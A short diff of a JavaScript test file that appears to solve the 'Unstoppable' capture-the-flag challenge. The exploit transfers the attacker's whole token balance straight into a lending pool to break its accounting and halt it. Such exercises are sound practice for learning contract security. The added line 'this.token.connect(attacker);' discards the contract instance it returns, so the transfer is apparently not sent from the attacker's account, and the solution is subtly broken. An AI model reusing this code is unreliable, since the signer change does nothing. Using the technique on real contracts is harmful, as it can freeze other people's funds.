@@ -51,10 +51,10 @@ describe("[Challenge] Unstoppable", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
+    this.token.connect(attacker);
     await this.token.transfer(
       this.pool.address,
-      INITIAL_ATTACKER_TOKEN_BALANCE,
-      { from: attacker }
+      INITIAL_ATTACKER_TOKEN_BALANCE
     );
   });
 
